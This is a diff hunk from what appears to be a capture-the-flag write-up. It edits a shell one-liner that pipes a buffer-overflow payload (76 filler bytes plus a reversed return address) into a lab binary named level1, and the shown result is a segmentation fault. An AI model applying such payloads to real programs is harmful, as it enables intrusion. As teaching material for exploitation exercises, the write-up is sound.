@@ -130,7 +130,7 @@ It means we have to reverse the address. `0x08048444 => 0x44840408`
 Now we have everything we need, we can create the overflow.
 
 ```shell
-echo `perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' 2> /dev/null` | ./level1
+perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' 2> /dev/null | ./level1
 
 > Good... Wait what?
 > Segmentation fault (core dumped)
